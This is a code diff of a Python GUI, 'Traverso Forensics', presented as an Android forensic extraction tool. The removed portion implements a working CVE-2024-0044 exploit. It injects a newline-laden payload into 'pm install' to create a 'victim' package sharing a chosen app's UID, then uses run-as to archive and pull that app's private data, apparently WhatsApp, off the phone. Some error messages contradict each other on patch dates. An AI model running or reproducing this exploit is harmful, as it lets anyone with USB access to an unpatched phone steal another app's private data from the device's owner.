-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            pdf_filename = f"Report_{package_name}_{timestamp}.pdf"
-            pdf_path = os.path.join(extraction_dir, pdf_filename)
-            
-            self.write_log(f"Generating PDF report: {pdf_filename}")
-            
-            doc = SimpleDocTemplate(pdf_path, pagesize=letter, rightMargin=72, leftMargin=72,
-                                  topMargin=72, bottomMargin=18)
-            
-            Story = []
-            styles = getSampleStyleSheet()
-            
-            heading_style = ParagraphStyle('CustomHeading', parent=styles['Heading2'], fontSize=14,
-                                          textColor=colors.HexColor('#2196F3'), spaceAfter=12, spaceBefore=12)
-            
-            if os.path.exists("traverso_logo.png"):
-                try:
-                    logo = RLImage("traverso_logo.png", width=3*inch, height=0.8*inch)
-                    Story.append(logo)
-                    Story.append(Spacer(1, 15))
-                except Exception as e:
-                    self.write_log(f"Could not load logo: {e}", "WARNING")
-                    Story.append(Paragraph("TRAVERSO FORENSICS", 
-                                         ParagraphStyle('FallbackTitle', parent=styles['Heading1'], 
-                                                       fontSize=24, alignment=TA_CENTER)))
-                    Story.append(Spacer(1, 15))
-            else:
-                Story.append(Paragraph("TRAVERSO FORENSICS", 
-                                     ParagraphStyle('FallbackTitle', parent=styles['Heading1'], 
-                                                   fontSize=24, alignment=TA_CENTER)))
-                Story.append(Spacer(1, 15))
-            
-            Story.append(Paragraph("FORENSIC REPORT - PHONE CONTENT", heading_style))
-            Story.append(Spacer(1, 12))
-            
-            case_data = [
-                ['Case Details', ''],
-                ['Case Number:', '1'],
-                ['Case Evidence Number:', '1'],
-                ['Evidence Order Details:', package_name.upper()]
-            ]
-            
-            case_table = Table(case_data, colWidths=[3*inch, 4*inch])
-            case_table.setStyle(TableStyle([
-                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#2d2d2d')),
-                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
-                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-                ('FONTSIZE', (0, 0), (-1, 0), 12),
-                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
-                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
-                ('GRID', (0, 0), (-1, -1), 1, colors.black)
-            ]))
-            
-            Story.append(case_table)
-            Story.append(Spacer(1, 20))
-            
-            device_info = self.extraction_data
-            device_data = [
-                ['Device Information', ''],
-                ['Dev-Name:', device_info.get('dev_name', 'Unknown')],
-                ['Model-Nr:', device_info.get('model', 'Unknown')],
-                ['UDID:', device_info.get('serialnr', 'N/A')],
-                ['Hardware:', device_info.get('hardware', 'N/A')],
-                ['WiFi MAC:', device_info.get('wifi_mac', 'N/A')],
-                ['Product:', device_info.get('product', 'N/A')],
-                ['BT MAC:', device_info.get('bt_mac', 'N/A')],
-                ['Software:', device_info.get('software', 'N/A')],
-                ['Capacity:', device_info.get('capacity', 'N/A')],
-                ['Build Nr:', device_info.get('build_nr', 'N/A')],
-                ['Free Space:', device_info.get('free_space', 'N/A')],
-                ['Language:', device_info.get('language', 'N/A')],
-                ['ECID:', 'N/A'],
-                ['Serialnr:', device_info.get('serialnr', 'N/A')],
-                ['IMEI:', device_info.get('imei', 'Not Available')],
-                ['MLB-snr:', 'N/A'],
-            ]
-            
-            device_table = Table(device_data, colWidths=[2.5*inch, 4.5*inch])
-            device_table.setStyle(TableStyle([
-                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#2d2d2d')),
-                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
-                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-                ('FONTSIZE', (0, 0), (-1, -1), 9),
-                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
-                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
-                ('GRID', (0, 0), (-1, -1), 1, colors.black)
-            ]))
-            
-            Story.append(device_table)
-            Story.append(Spacer(1, 20))
-            
-            extraction_data = [
-                ['Extraction Details', ''],
-                ['Extraction Started:', self.extraction_start_time or 'N/A'],
-                ['Extraction Finished:', datetime.now().strftime('%d/%m/%Y %H:%M:%S (UTC-3)')],
-                ['Extracted By:', 'Traverso Forensics Android App Extraction 1.0'],
-                ['Report Generated By:', 'Traverso Forensics Android App Extraction 1.0']
-            ]
-            
-            ext_table = Table(extraction_data, colWidths=[3*inch, 4*inch])
-            ext_table.setStyle(TableStyle([
-                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#2d2d2d')),
-                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
-                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-                ('FONTSIZE', (0, 0), (-1, 0), 12),
-                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
-                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
-                ('GRID', (0, 0), (-1, -1), 1, colors.black)
-            ]))
-            
-            Story.append(ext_table)
-            Story.append(PageBreak())
-            
-            Story.append(Paragraph("Extraction Log", heading_style))
-            Story.append(Spacer(1, 12))
-            
-            log_style = ParagraphStyle('LogStyle', parent=styles['Code'], fontSize=7, leading=9)
-            
-            for entry in self.log_entries:
-                log_line = f"[{entry['timestamp']}] [{entry['level']}] {entry['message']}"
-                Story.append(Paragraph(log_line, log_style))
-            
-            Story.append(PageBreak())
-            
-            Story.append(Paragraph("Installed Applications on Device", heading_style))
-            Story.append(Spacer(1, 12))
-            
-            apps_data = [['Package Name', 'UID']]
-            for app in self.apps_list[:100]:
-                apps_data.append([app['package'], app['uid']])
-            
-            apps_table = Table(apps_data, colWidths=[5*inch, 1*inch])
-            apps_table.setStyle(TableStyle([
-                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
-                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
-                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-                ('FONTSIZE', (0, 0), (-1, -1), 7),
-                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
-                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
-                ('GRID', (0, 0), (-1, -1), 1, colors.black)
-            ]))
-            
-            Story.append(apps_table)
-            
-            if len(self.apps_list) > 100:
-                Story.append(Spacer(1, 12))
-                Story.append(Paragraph(f"... and {len(self.apps_list) - 100} more applications", styles['Italic']))
-            
-            doc.build(Story)
-            self.write_log(f"PDF report generated successfully: {pdf_filename}", "SUCCESS")
-            return pdf_path
-            
-        except Exception as e:
-            self.write_log(f"Error generating PDF report: {e}", "ERROR")
-            import traceback
-            self.write_log(f"Traceback: {traceback.format_exc()}", "ERROR")
-            return None
-    
-    def update_files_list(self, directory):
-        self.files_text.config(state=tk.NORMAL)
-        self.files_text.delete(1.0, tk.END)
-        
-        if not os.path.exists(directory):
-            self.files_text.insert(tk.END, "This folder is empty.")
-            self.files_text.config(state=tk.DISABLED)
-            return
-        
-        files_found = False
-        for root, dirs, files in os.walk(directory):
-            for file in files:
-                files_found = True
-                file_path = os.path.join(root, file)
-                rel_path = os.path.relpath(file_path, directory)
-                mod_time = os.path.getmtime(file_path)
-                mod_date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(mod_time))
-                file_type = os.path.splitext(file)[1] or "File"
-                line = f"{rel_path:<50} {mod_date:<20} {file_type}\n"
-                self.files_text.insert(tk.END, line)
-        
-        if not files_found:
-            self.files_text.insert(tk.END, "This folder is empty.")
-        
-        self.files_text.config(state=tk.DISABLED)
-    
-    def start_extraction(self):
-        package = self.selected_package.get()
-        uid = self.selected_uid.get()
-        
-        if not package or not uid:
-            messagebox.showwarning("Selection Required", "Please select an application first")
-            return
-        
-        result = messagebox.askyesno("Confirm Extraction",
-                                    f"Extract data from:\n\n"
-                                    f"Application: {package}\n"
-                                    f"UID: {uid}\n\n"
-                                    f"WARNING: This exploit only works on Android 12/13\n"
-                                    f"without March 2024 security update")
-        
-        if not result:
-            return
-        
-        self.start_btn.config(state=tk.DISABLED, bg=self.bg_input)
-        self.files_text.config(state=tk.NORMAL)
-        self.files_text.delete(1.0, tk.END)
-        self.files_text.insert(tk.END, "Extraction in progress...")
-        self.files_text.config(state=tk.DISABLED)
-        self.extraction_start_time = datetime.now().strftime('%d/%m/%Y %H:%M:%S (UTC-3)')
-        
-        threading.Thread(target=self.perform_extraction, args=(package, uid), daemon=True).start()
-    
-    def perform_extraction(self, package, uid):
-        try:
-            timestamp = time.strftime("%Y%m%d_%H%M%S")
-            self.extraction_dir = f"extraction_{package}_{timestamp}"
-            os.makedirs(self.extraction_dir, exist_ok=True)
-            self.create_log_file(self.extraction_dir)
-            
-            self.update_progress(0, 7, "Starting extraction...")
-            self.write_log("=" * 80)
-            self.write_log("STARTING EXTRACTION PROCESS")
-            self.write_log(f"Package: {package}")
-            self.write_log(f"UID: {uid}")
-            self.write_log("=" * 80)
-            
-            # Detectar nivel de parche de seguridad
-            self.write_log("Checking device security patch level...")
-            patch_level, _, _ = self.run_adb_command("getprop ro.build.version.security_patch", shell=True)
-            patch_level = patch_level.strip()
-            self.write_log(f"Security patch level: {patch_level}")
-            
-            # Advertir si el parche es posterior a marzo 2024 (o octubre 2024 para el bypass patch)
-            if patch_level:
-                try:
-                    year, month = patch_level.split('-')[:2]
-                    patch_date = int(year) * 12 + int(month)
-                    first_patch_date = 2024 * 12 + 3  # Marzo 2024 - primer parche
-                    final_patch_date = 2024 * 12 + 10  # Octubre 2024 - parche del bypass
-                    
-                    if patch_date >= final_patch_date:
-                        self.write_log(f"WARNING: Device patch ({patch_level}) is AFTER October 2024", "WARNING")
-                        self.write_log("This device is PATCHED against CVE-2024-0044 (including bypass)", "WARNING")
-                        self.write_log("Extraction will fail", "WARNING")
-                        
-                        response = messagebox.askyesno(
-                            "Device is Patched",
-                            f"WARNING: This device has security patch level {patch_level}\n\n"
-                            f"CVE-2024-0044 was fully patched in October 2024.\n"
-                            f"Your device is PATCHED (including bypass).\n\n"
-                            f"The extraction will definitely fail.\n\n"
-                            f"Do you want to continue anyway?",
-                            icon='warning'
-                        )
-                        
-                        if not response:
-                            self.write_log("User cancelled extraction due to patch warning", "INFO")
-                            return
-                    elif patch_date >= first_patch_date:
-                        self.write_log(f"INFO: Device patch ({patch_level}) has first patch (March 2024)", "WARNING")
-                        self.write_log("Bypass exploit may still work (patched October 2024)", "INFO")
-                    else:
-                        self.write_log(f"Device patch ({patch_level}) is VULNERABLE to CVE-2024-0044", "SUCCESS")
-                except:
-                    self.write_log("Could not parse security patch date", "WARNING")
-            
-            self.write_log("=" * 80)
-            
-            apk_path = "F-Droid.apk"
-            if not os.path.exists(apk_path):
-                self.write_log(f"APK file not found: {apk_path}", "ERROR")
-                messagebox.showerror("APK Not Found",
-                                   f"{apk_path} not found\n\nDownload an APK from F-Droid.org")
-                return
-            
-            self.write_log(f"APK file found: {apk_path}")
-            
-            self.update_progress(1, 7, "Step 1/6: Pushing APK to device...")
-            self.write_log("STEP 1: Pushing APK to device...")
-            stdout, stderr, code = self.run_adb_command(f"push {apk_path} /data/local/tmp/")
-            if code != 0:
-                self.write_log(f"Failed to push APK: {stderr}", "ERROR")
-                messagebox.showerror("Error", f"Error pushing APK: {stderr}")
-                return
-            self.write_log("APK pushed successfully", "SUCCESS")
-            
-            self.update_progress(2, 7, "Step 2/6: Executing CVE-2024-0044 exploit...")
-            self.write_log("STEP 2: Executing CVE-2024-0044 exploit...")
-            payload = f'''@null
-victim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null'''
-            
-            script_content = f'''PAYLOAD="{payload}"
-pm install -i "$PAYLOAD" /data/local/tmp/{apk_path}
-'''
-            
-            with open("exploit_script.sh", "w", newline='\n') as f:
-                f.write(script_content)
-            
-            self.write_log("Exploit script created")
-            self.run_adb_command("push exploit_script.sh /data/local/tmp/")
-            
-            commands = "cd /data/local/tmp/\nsh exploit_script.sh"
-            subprocess.run(["adb", "shell"], input=commands, capture_output=True, text=True, timeout=30)
-            
-            self.write_log("Exploit executed", "SUCCESS")
-            time.sleep(2)
-            
-            # VERIFICACIÓN DEL EXPLOIT - NUEVO
-            self.write_log("Verifying exploit success...")
-            check_victim, check_stderr, check_code = self.run_adb_command("run-as victim id", shell=True)
-            self.write_log(f"Victim user check stdout: {check_victim}")
-            self.write_log(f"Victim user check stderr: {check_stderr}")
-            self.write_log(f"Victim user check exit code: {check_code}")
-            
-            if check_code != 0 or "unknown" in check_victim.lower() or "not found" in check_victim.lower():
-                self.write_log("EXPLOIT FAILED: 'victim' user was not created", "ERROR")
-                self.write_log("This device may be patched against CVE-2024-0044", "ERROR")
-                messagebox.showerror("Exploit Failed", 
-                                   "CVE-2024-0044 exploit failed to create 'victim' user.\n\n"
-                                   "Possible causes:\n"
-                                   "• Device has security patch after October 2022\n"
-                                   "• CVE-2024-0044 has been patched\n"
-                                   "• SELinux policies are blocking the exploit\n\n"
-                                   "Check the log file for details.")
-                return
-            else:
-                self.write_log(f"EXPLOIT SUCCESSFUL: victim user created with UID: {check_victim.strip()}", "SUCCESS")
-            
-            self.update_progress(3, 7, "Step 3/6: Creating backup archive...")
-            self.write_log("STEP 3: Creating backup archive...")
-            
-            # MÉTODO CORREGIDO: Crear TAR dentro del directorio de la app
-            # Luego copiarlo a /data/local/tmp usando redirección
-            
-            self.write_log("Creating TAR inside app directory (where we have permissions)...")
-            
-            # Paso 3.1: Crear TAR dentro de /data/data/package/
-            tar_internal_path = f"/data/data/{package}/backup.tar"
-            
-            commands = f'''run-as victim sh << 'EOF'
-cd /data/data/{package}
-tar -cf {tar_internal_path} .
-chmod 777 {tar_internal_path}
-exit
-EOF'''
-            
-            self.write_log(f"Creating TAR at: {tar_internal_path}")
-            result = subprocess.run(["adb", "shell"], input=commands, capture_output=True, text=True, timeout=120)
-            
-            if result.stdout:
-                self.write_log(f"TAR creation stdout: {result.stdout}")
-            if result.stderr:
-                self.write_log(f"TAR creation stderr: {result.stderr}", "WARNING")
-            
-            # Verificar que el TAR se creó dentro de la app
-            stdout, stderr, code = self.run_adb_command(f"run-as victim ls -lh {tar_internal_path}", shell=True)
-            self.write_log(f"Internal TAR verification: {stdout}")
-            
-            if code != 0:
-                self.write_log("Failed to create TAR inside app directory", "ERROR")
-                messagebox.showerror("Error", 
-                                   "Failed to create backup archive inside app directory.\n\n"
-                                   "Check the log file for details.")
-                return
-            
-            # Verificar si está vacío
-            if " 0 " in stdout or " 0B " in stdout:
-                self.write_log("WARNING: TAR created but is EMPTY", "ERROR")
-                messagebox.showerror("Error", 
-                                   "Backup archive was created but is empty (0 bytes).\n\n"
-                                   "The app may not have any data, or tar failed to process files.")
-                return
-            
-            self.write_log(f"TAR created successfully: {stdout.strip()}", "SUCCESS")
-            
-            # Paso 3.2: Copiar el TAR a /data/local/tmp usando cat (método que funciona)
-            self.write_log("Copying TAR to /data/local/tmp...")
-            
-            # Crear directorio de destino con permisos completos
-            self.run_adb_command("mkdir -p /data/local/tmp/wa/", shell=True)
-            self.run_adb_command("chmod 0777 /data/local/tmp/wa/", shell=True)
-            
-            # Copiar usando cat (redirección de stdout)
-            copy_command = f"run-as victim cat {tar_internal_path} > /data/local/tmp/wa/wa.tar"
-            stdout, stderr, code = self.run_adb_command(copy_command, shell=True)
-            
-            self.write_log(f"Copy command: {copy_command}")
-            self.write_log(f"Copy exit code: {code}")
-            if stdout:
-                self.write_log(f"Copy stdout: {stdout}")
-            if stderr:
-                self.write_log(f"Copy stderr: {stderr}")
-            
-            # Limpiar TAR interno
-            self.run_adb_command(f"run-as victim rm {tar_internal_path}", shell=True)
-            self.write_log("Cleaned up internal TAR file")
-            
-            stdout, stderr, code = self.run_adb_command("ls -lh /data/local/tmp/wa/wa.tar", shell=True)
-            self.write_log(f"TAR file details: {stdout}")
-            
-            if code != 0:
-                self.write_log("Failed to create backup - TAR file not found", "ERROR")
-                messagebox.showerror("Error", 
-                                   "Failed to create backup archive.\n\n"
-                                   "The TAR file was not created on the device.\n"
-                                   "Check the log file for details.")
-                return
-            
-            # Verificar si el archivo está vacío (0 bytes)
-            if " 0 " in stdout or " 0B " in stdout:
-                self.write_log("WARNING: TAR file is EMPTY (0 bytes)", "ERROR")
-                self.write_log("This indicates the exploit did not successfully access app data", "ERROR")
-                
-                # Diagnóstico adicional
-                self.write_log("Running additional diagnostics...")
-                
-                # Verificar si el paquete existe
-                pkg_check, _, _ = self.run_adb_command(f"run-as victim ls -la /data/data/{package} 2>&1", shell=True)
-                self.write_log(f"Package directory check: {pkg_check}")
-                
-                # Verificar permisos SELinux
-                selinux_check, _, _ = self.run_adb_command("getenforce", shell=True)
-                self.write_log(f"SELinux status: {selinux_check}")
-                
-                messagebox.showerror("Extraction Failed - Empty TAR", 
-                                   f"The backup file was created but is EMPTY (0 bytes).\n\n"
-                                   f"This means CVE-2024-0044 exploit failed to access app data.\n\n"
-                                   f"Possible causes:\n"
-                                   f"• Security patch has fixed this vulnerability\n"
-                                   f"• SELinux is blocking access: {selinux_check.strip()}\n"
-                                   f"• App data protection is enabled\n\n"
-                                   f"Your device patch: March 2023 (likely patched)\n"
-                                   f"Vulnerable devices: October 2022 or earlier\n\n"
-                                   f"Check log file for detailed diagnostics.")
-                return
-            
-            self.write_log(f"Backup created successfully: {stdout.strip()}", "SUCCESS")
-            
-            self.update_progress(4, 7, "Step 4/6: Downloading wa.tar and calculating HASH...")
-            self.write_log("STEP 4: Downloading backup from device...")
-            
-            output_file = os.path.join(self.extraction_dir, "wa.tar")
-            stdout, stderr, code = self.run_adb_command(f"pull /data/local/tmp/wa/wa.tar {output_file}")
-            
-            if code != 0 or not os.path.exists(output_file):
-                self.write_log(f"Failed to download backup: {stderr}", "ERROR")
-                messagebox.showerror("Error", f"Error downloading backup: {stderr}")
-                return
-            
-            file_size = os.path.getsize(output_file)
-            self.write_log(f"Backup downloaded: {output_file} ({file_size/1024/1024:.2f} MB)", "SUCCESS")
-            
-            # SIMPLIFICACIÓN: HASH DEL TAR SIN DESCOMPRIMIR
-            self.write_log("Calculating SHA256 of wa.tar...")
-            hash_value = self.calculate_hash256(output_file)
-            hash_filename = f"{package}_{timestamp}_wa_tar_SHA256.txt"
-            hash_path = os.path.join(self.extraction_dir, hash_filename)
-            
-            with open(hash_path, 'w') as f:
-                f.write(f"File: wa.tar\n")
-                f.write(f"SHA256: {hash_value}\n")
-                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-                f.write(f"Package: {package}\n")
-                f.write(f"Size: {file_size} bytes ({file_size/1024/1024:.2f} MB)\n")
-            
-            self.write_log(f"SHA256 calculated: {hash_value}", "SUCCESS")
-            
-            # GENERACIÓN DE REPORTE PDF (MANTENIDA)
-            self.update_progress(5, 7, "Step 5/6: Generating PDF report...")
-            pdf_path = self.generate_pdf_report(self.extraction_dir, package, uid)
-            
-            if pdf_path:
-                pdf_hash = self.calculate_hash256(pdf_path)
-                pdf_hash_file = pdf_path.replace('.pdf', '_SHA256.txt')
-                with open(pdf_hash_file, 'w') as f:
-                    f.write(f"File: {os.path.basename(pdf_path)}\n")
-                    f.write(f"SHA256: {pdf_hash}\n")
-                    f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-                self.write_log(f"PDF hash calculated: {pdf_hash}", "SUCCESS")
-            
-            self.update_files_list(self.extraction_dir)
-            
-            self.update_progress(7, 7, "Extraction completed successfully!")
-            
-            self.files_text.config(state=tk.NORMAL)
-            self.files_text.insert(tk.END, f"\n\n✓ Extraction completed!\n")
-            self.files_text.insert(tk.END, f"✓ File: wa.tar\n")
-            self.files_text.insert(tk.END, f"✓ SHA256: {hash_value}\n")
-            if pdf_path:
-                 self.files_text.insert(tk.END, f"✓ Report: {os.path.basename(pdf_path)}\n")
-            self.files_text.insert(tk.END, f"✓ Location: {os.path.abspath(self.extraction_dir)}\n")
-            self.files_text.config(state=tk.DISABLED)
-            
-            self.write_log("Cleaning up temporary files on device...")
-            self.run_adb_command("rm -rf /data/local/tmp/wa/", shell=True)
-            self.run_adb_command("rm /data/local/tmp/exploit_script.sh", shell=True)
-            self.run_adb_command(f"rm /data/local/tmp/{apk_path}", shell=True)
-            
-            if os.path.exists("exploit_script.sh"):
-                os.remove("exploit_script.sh")
-            
-            self.write_log("=" * 80)
-            self.write_log("EXTRACTION COMPLETED SUCCESSFULLY!", "SUCCESS")
-            self.write_log(f"Extraction directory: {self.extraction_dir}")
-            self.write_log(f"File: wa.tar")
-            self.write_log(f"SHA256: {hash_value}")
-            if pdf_path:
-                self.write_log(f"Report: {pdf_path}")
-            self.write_log(f"Log file: {self.log_file}")
-            self.write_log("=" * 80)
-            
-            messagebox.showinfo("Extraction Completed",
-                              f"Extraction successful!\n\n"
-                              f"File: wa.tar\n"
-                              f"SHA256: {hash_value[:32]}...\n"
-                              f"Report: {os.path.basename(pdf_path) if pdf_path else 'Failed'}\n\n"
-                              f"Saved in: {self.extraction_dir}\n"
-                              f"Log: {self.log_file}")
-            
-        except Exception as e:
-            if self.log_file:
-                self.write_log(f"CRITICAL ERROR: {str(e)}", "ERROR")
-                import traceback
-                self.write_log(f"Traceback: {traceback.format_exc()}", "ERROR")
-            messagebox.showerror("Error", f"Error during extraction:\n{e}")
-        
-        finally:
-            self.start_btn.config(state=tk.NORMAL, bg=self.accent_green)
-            self.update_progress(0, 7, "")
+class TraversoForensicsGUI:
+   """
+   Traverso Forensics - Professional Android Extraction Suite
+   Following ISO/IEC 27037:2012 Guidelines for Digital Evidence
+   CVE-2024-0044 Exploit Implementation (Payload Injection Method)
+   """
+   
+   def __init__(self, root):
+       self.root = root
+       self.root.title("Traverso Forensics - Professional Extraction Suite v1.0")
+       self.root.geometry("1200x800")
+       self.root.configure(bg="#1e1e1e")
+       self.root.resizable(True, True)
+       
+       # Variables
+       self.device_connected = tk.BooleanVar(value=False)
+       self.selected_package = tk.StringVar()
+       self.selected_uid = tk.StringVar()
+       self.device_info = {}
+       self.apps_list = []
+       self.log_file = None
+       self.log_entries = []
+       self.log_buffer = []
+       self.extraction_dir = None
+       self.extraction_data = {}
+       
+       # Verification system
+       self.verifier = None
+       
+       # Setup UI
+       self.setup_styles()
+       self.create_header()
+       self.create_main_panels()
+       self.create_footer()
+       
+       # Auto-detect device on startup
+       self.root.after(500, self.auto_detect_device)
+   
+   def setup_styles(self):
+       """Setup dark theme colors"""
+       self.bg_dark = "#1e1e1e"
+       self.bg_panel = "#2d2d2d"
+       self.bg_input = "#3e3e3e"
+       self.fg_text = "#f0f0f0"
+       self.fg_secondary = "#a0a0a0"
+       self.accent_green = "#2ecc71"
+       self.accent_blue = "#3498db"
+       self.accent_red = "#e74c3c"
+       self.accent_orange = "#f39c12"
+       
+       style = ttk.Style()
+       style.theme_use('clam')
+       style.configure("blue.Horizontal.TProgressbar",
+                      troughcolor=self.bg_input,
+                      background=self.accent_blue,
+                      bordercolor=self.bg_panel,
+                      lightcolor=self.accent_blue,
+                      darkcolor=self.accent_blue)
+   
+   def create_header(self):
+       """Create header with logo"""
+       header = tk.Frame(self.root, bg=self.bg_dark, height=80)
+       header.pack(fill=tk.X, side=tk.TOP)
+       header.pack_propagate(False)
+       
+       # Logo
+       logo_path = "traverso_logo.png"
+       try:
+           if os.path.exists(logo_path):
+               logo = tk.PhotoImage(file=logo_path)
+               logo = logo.subsample(10, 10)
+               logo_label = tk.Label(header, image=logo, bg=self.bg_dark)
+               logo_label.image = logo
+               logo_label.pack(side=tk.LEFT, padx=20)
+       except:
+           pass
+       
+       # Title
+       title_frame = tk.Frame(header, bg=self.bg_dark)
+       title_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+       
+       tk.Label(title_frame, text="Traverso Forensics",
+               font=("Segoe UI", 24, "bold"),
+               foreground="white",
+               background=self.bg_dark).pack(anchor=tk.W, pady=(10, 0))
+       
+       tk.Label(title_frame, text="Professional Android Extraction - CVE-2024-0044 (ISO/IEC 27037:2012)",
+               font=("Segoe UI", 10),
+               foreground=self.fg_secondary,
+               background=self.bg_dark).pack(anchor=tk.W)
+   
+   def create_main_panels(self):
+       """Create main UI panels"""
+       container = tk.Frame(self.root, bg=self.bg_dark)
+       container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+       
+       # Left panel (device + apps)
+       left_panel = self.create_left_panel(container)
+       left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
+       
+       # Right panel (selected app + extraction)
+       right_panel = self.create_right_panel(container)
+       right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
+   
+   def create_left_panel(self, parent):
+       """Create left panel with device info and app list"""
+       panel = tk.Frame(parent, bg=self.bg_panel)
+       
+       # Device Status Panel (Enhanced with colors)
+       status_header = tk.Frame(panel, bg=self.bg_panel)
+       status_header.pack(fill=tk.X, padx=15, pady=(15, 5))
+       
+       tk.Label(status_header, text="Device Status", font=("Segoe UI", 12, "bold"),
+               foreground=self.fg_text, background=self.bg_panel).pack(side=tk.LEFT)
+       
+       self.refresh_device_btn = tk.Button(status_header, text="🔄 Refresh",
+                                          bg=self.accent_blue, fg="white",
+                                          font=("Segoe UI", 9, "bold"), relief=tk.FLAT,
+                                          padx=15, pady=4, cursor="hand2",
+                                          command=self.check_device)
+       self.refresh_device_btn.pack(side=tk.RIGHT)
+       
+       # Status indicator with color
+       status_indicator_frame = tk.Frame(panel, bg=self.bg_input, relief=tk.FLAT, bd=2)
+       status_indicator_frame.pack(fill=tk.X, padx=15, pady=(0, 5))
+       
+       indicator_top = tk.Frame(status_indicator_frame, bg=self.bg_input)
+       indicator_top.pack(fill=tk.X, padx=10, pady=(10, 5))
+       
+       self.status_indicator = tk.Label(indicator_top, text="●", font=("Segoe UI", 16),
+                                        foreground=self.accent_red, background=self.bg_input)
+       self.status_indicator.pack(side=tk.LEFT, padx=(0, 10))
+       
+       self.connection_status_label = tk.Label(indicator_top,
+                                              text="No device detected",
+                                              font=("Segoe UI", 11, "bold"),
+                                              foreground=self.accent_red,
+                                              background=self.bg_input)
+       self.connection_status_label.pack(side=tk.LEFT)
+       
+       # Device info text area
+       device_frame = tk.Frame(status_indicator_frame, bg=self.bg_input)
+       device_frame.pack(fill=tk.BOTH, padx=10, pady=(0, 10))
+       
+       self.device_text = scrolledtext.ScrolledText(device_frame, height=3, bg=self.bg_input,
+                                                    fg=self.fg_secondary, font=("Consolas", 9),
+                                                    relief=tk.FLAT, borderwidth=0)
+       self.device_text.pack(fill=tk.BOTH)
+       self.device_text.insert(1.0, "Connect device via USB and enable USB debugging\nThen click 'Detect Device' or 'Refresh' button")
+       self.device_text.config(state=tk.DISABLED)
+       
+       # Buttons
+       btn_frame = tk.Frame(panel, bg=self.bg_panel)
+       btn_frame.pack(fill=tk.X, padx=15, pady=(5, 15))
+       
+       self.detect_btn = tk.Button(btn_frame, text="Detect Device", bg=self.accent_green,
+                                   fg="white", font=("Segoe UI", 10, "bold"), relief=tk.FLAT,
+                                   padx=20, pady=8, cursor="hand2", command=self.check_device)
+       self.detect_btn.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(0, 5))
+       
+       self.listapps_btn = tk.Button(btn_frame, text="List All Apps", bg=self.bg_input,
+                                     fg=self.fg_text, font=("Segoe UI", 10, "bold"),
+                                     relief=tk.FLAT, padx=20, pady=8, cursor="hand2",
+                                     command=self.list_all_apps, state=tk.DISABLED)
+       self.listapps_btn.pack(side=tk.RIGHT, expand=True, fill=tk.X, padx=(5, 0))
+       
+       # Applications List section
+       tk.Label(panel, text="Applications List", font=("Segoe UI", 12, "bold"),
+               foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(10, 10))
+       
+       # Filter options
+       filter_frame = tk.Frame(panel, bg=self.bg_panel)
+       filter_frame.pack(fill=tk.X, padx=15, pady=(0, 5))
+       
+       self.app_filter = tk.StringVar(value="all")
+       
+       tk.Radiobutton(filter_frame, text="All", variable=self.app_filter, value="all",
+                     bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
+                     font=("Segoe UI", 9), activebackground=self.bg_panel,
+                     command=self.filter_apps).pack(side=tk.LEFT, padx=5)
+       
+       tk.Radiobutton(filter_frame, text="Third-party", variable=self.app_filter, value="third_party",
+                     bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
+                     font=("Segoe UI", 9), activebackground=self.bg_panel,
+                     command=self.filter_apps).pack(side=tk.LEFT, padx=5)
+       
+       tk.Radiobutton(filter_frame, text="Native", variable=self.app_filter, value="native",
+                     bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
+                     font=("Segoe UI", 9), activebackground=self.bg_panel,
+                     command=self.filter_apps).pack(side=tk.LEFT, padx=5)
+       
+       # Search box
+       search_frame = tk.Frame(panel, bg=self.bg_panel)
+       search_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
+       
+       self.search_var = tk.StringVar()
+       self.search_var.trace('w', lambda *args: self.filter_apps())
+       
+       search_entry = tk.Entry(search_frame, textvariable=self.search_var,
+                              bg=self.bg_input, fg=self.fg_text, font=("Segoe UI", 9),
+                              relief=tk.FLAT, insertbackground=self.fg_text)
+       search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5), ipady=5)
+       
+       clear_btn = tk.Button(search_frame, text="✕", bg=self.bg_input, fg=self.fg_text,
+                            font=("Segoe UI", 9), relief=tk.FLAT, padx=10, cursor="hand2",
+                            command=lambda: self.search_var.set(""))
+       clear_btn.pack(side=tk.RIGHT)
+       
+       # Apps listbox
